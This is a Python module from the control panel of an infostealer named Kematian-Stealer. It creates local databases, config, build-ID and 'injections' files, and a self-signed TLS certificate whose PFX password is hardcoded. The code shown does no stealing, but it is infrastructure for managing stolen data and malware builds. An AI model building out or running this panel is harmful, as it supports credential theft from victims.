import os
import logging
import ipaddress
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import pkcs12
from datetime import datetime, timedelta, timezone
from panel.ui.modules.settings.settings import Settings


class MakeFiles:
    """Sets up the necessary files and directories for the application to run properly."""

    def __init__(self) -> None:
        """Simply sets the appdir variable to the APPDATA environment variable."""
        self.appdir = os.getenv("APPDATA")
        self.directoryName = "Kematian-Stealer"
        self.logs_directory = "logs"

    def make_appdir_directory(self) -> None:
        """Makes the directory where all the files and directories will be stored."""
        if not os.path.exists(os.path.join(self.appdir, self.directoryName)):
            os.mkdir(os.path.join(self.appdir, self.directoryName))

    def get_appdir_directory(self) -> str:
        """Gets the directory where all the files and directories are stored.

        Returns:
            str: Returns the directory where all the files and directories are stored.
        """
        return os.path.join(self.appdir, self.directoryName)

    def makeSQLiteDB(self) -> None:
        """Makes the SQLite database file where all the data will be stored."""
        self.dbName = "kdot.db"
        self.dbPath = os.path.join(self.appdir, self.directoryName, self.dbName)
        if not os.path.exists(self.dbPath):
            with open(self.dbPath, "w") as f:
                f.write("")

    def get_SQLiteDB_path(self) -> str:
        """Method to get the path of the SQLite database file.

        Returns:
            str: Returns the path of the SQLite database file."""
        return os.path.join(self.appdir, self.directoryName, "kdot.db")

    def makeSQLiteDBGraphs(self) -> None:
        """Makes the SQLite database file where all the data will be stored."""
        self.dbName = "graphs.db"
        self.dbPath = os.path.join(self.appdir, self.directoryName, self.dbName)
        if not os.path.exists(self.dbPath):
            with open(self.dbPath, "w") as f:
                f.write("")

    def get_SQLiteDBGraphs_path(self) -> str:
        """Method to get the path of the SQLite database file.

        Returns:
            str: Returns the path of the SQLite database file."""
        return os.path.join(self.appdir, self.directoryName, "graphs.db")

    def make_config(self) -> None:
        """Makes the config file where all the settings will be stored."""
        settings = Settings()
        self.configName = "config.json"
        self.configPath = os.path.join(self.appdir, self.directoryName, self.configName)

        if not os.path.exists(self.configPath):
            with open(self.configPath, "w") as f:
                f.write("{}")
            settings.set_to_defaults()

    def get_config_file_path(self) -> str:
        """Gets the path of the config file.

        Returns:
            str: Returns the path of the config file.
        """
        return os.path.join(self.appdir, self.directoryName, "config.json")

    def make_logs_directory(self) -> None:
        """Makes the logs directory where all the logs will be stored."""
        if not os.path.exists(
            os.path.join(self.appdir, self.directoryName, self.logs_directory)
        ):
            os.mkdir(os.path.join(self.appdir, self.directoryName, self.logs_directory))

    def get_logs_directory(self) -> str:
        """Gets the logs directory where all the logs are stored.

        Returns:
            str: Returns the logs directory where all the logs are stored.
        """
        return os.path.join(self.appdir, self.directoryName, self.logs_directory)

    def make_build_ids_file(self) -> None:
        """Makes the build_ids file where all the build ids will be stored."""
        self.build_ids_file = "build_ids.json"
        if not os.path.exists(
            os.path.join(self.appdir, self.directoryName, self.build_ids_file)
        ):
            with open(
                os.path.join(self.appdir, self.directoryName, self.build_ids_file), "w"
            ) as f:
                f.write("{}")

    def get_build_ids_file_path(self) -> str:
        """Gets the path of the build_ids file.

        Returns:
            str: Returns the path of the build_ids file.
        """
        return os.path.join(self.appdir, self.directoryName, "build_ids.json")

    def fix_key_and_certs(self) -> None:
        # Certificate details
        cert_subject = {
            'CN': 'sped.lol',
            'O': 'Somali-Devs',
            'OU': 'Somali-Devs',
            'L': 'Chicago',
            'S': 'Illinois',
            'C': 'US'
        }
        
        san = ["DNS:localhost", "IP:127.0.0.1"]
        password = "kdot227"
        
        # Directory to store generated certs
        appdir = os.getenv("APPDATA")
        directory_name = "Kematian-Stealer"
        output_dir = os.path.join(appdir, directory_name)
        
        pfx_path = os.path.join(output_dir, "certificate.pfx")
        keyfile_path = os.path.join(output_dir, "keyfile.pem")
        certfile_path = os.path.join(output_dir, "certfile.pem")

        
        # Generate private key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # Generate public key
        public_key = private_key.public_key()
        
        # Create certificate subject and issuer
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, cert_subject['CN']),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, cert_subject['O']),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, cert_subject['OU']),
            x509.NameAttribute(NameOID.LOCALITY_NAME, cert_subject['L']),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, cert_subject['S']),
            x509.NameAttribute(NameOID.COUNTRY_NAME, cert_subject['C']),
        ])
        
        # Create subject alternative name extension
        alt_names = x509.SubjectAlternativeName([
            x509.DNSName("localhost"),
            x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
        ])
        
        # Build certificate
        now = datetime.now(timezone.utc)
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(public_key)
            .serial_number(x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + timedelta(days=365*4))
            .add_extension(alt_names, critical=False)
            .sign(private_key, hashes.SHA256())
        )
        
        # Serialize certificate and private key to PFX
        pfx_data = pkcs12.serialize_key_and_certificates(
            name=cert_subject['CN'].encode(),
            key=private_key,
            cert=cert,
            cas=None,
            encryption_algorithm=serialization.BestAvailableEncryption(password.encode())
        )
        
        # Write PFX to file
        with open(pfx_path, "wb") as f:
            f.write(pfx_data)
        
        # Serialize certificate and private key to PEM
        cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
        key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        # Write certificate and key to PEM files
        with open(certfile_path, "wb") as f:
            f.write(cert_pem)
        with open(keyfile_path, "wb") as f:
            f.write(key_pem)
        logging.info("Private key and certificate have been generated and saved.")
    
    def get_key_path(self) -> str:
        """Gets the path of the key file.

        Returns:
            str: Returns the path of the key file.
        """
        return os.path.join(self.appdir, self.directoryName, "keyfile.pem")

    def get_cert_path(self) -> str:
        """Gets the path of the certificate file.

        Returns:
            str: Returns the path of the certificate file.
        """
        return os.path.join(self.appdir, self.directoryName, "certfile.pem")
        
    def get_certificate_path(self) -> str:
        """Gets the path of the certificate file.

        Returns:
            str: Returns the path of the certificate file.
        """
        return os.path.join(self.appdir, self.directoryName, "certificate.pfx")

    def make_map_db(self) -> None:
        """Makes the SQLite database file where all the data will be stored."""
        self.dbName = "map.db"
        self.dbPath = os.path.join(self.appdir, self.directoryName, self.dbName)
        if not os.path.exists(self.dbPath):
            with open(self.dbPath, "w") as f:
                f.write("")

    def get_map_db_path(self) -> str:
        """Method to get the path of the SQLite database file.

        Returns:
            str: Returns the path of the SQLite database file."""
        return os.path.join(self.appdir, self.directoryName, "map.db")

    def make_injections_db(self) -> None:
        """Makes the SQLite database file where all the data will be stored."""
        self.dbName = "injections.json"
        self.dbPath = os.path.join(self.appdir, self.directoryName, self.dbName)
        if not os.path.exists(self.dbPath):
            with open(self.dbPath, "w") as f:
                f.write("{}")

    def get_injections_db_path(self) -> str:
        """Method to get the path of the SQLite database file.

        Returns:
            str: Returns the path of the SQLite database file."""
        return os.path.join(self.appdir, self.directoryName, "injections.json")

    def ensure_all_dirs(self) -> None:
        """Ensures that all the directories are present."""
        check_pairs = {
            self.get_appdir_directory(): self.make_appdir_directory,
            self.get_SQLiteDB_path(): self.makeSQLiteDB,
            self.get_config_file_path(): self.make_config,
            self.get_logs_directory(): self.make_logs_directory,
            self.get_build_ids_file_path(): self.make_build_ids_file,
            self.get_config_file_path(): self.make_config,
            self.get_map_db_path(): self.make_map_db,
            self.get_injections_db_path(): self.make_injections_db,
        }

        logging.critical(
            r"Ensuring all directories are present! If any are missing, the program will attempt to create them. If this fails, please delete the Kematian-Stealer folder in %appdata%."
        )

        for path, make_func in check_pairs.items():
            if not os.path.exists(path):
                make_func()
                logging.warning(f"Created {path}")
            else:
                logging.info(f"{path} already exists.")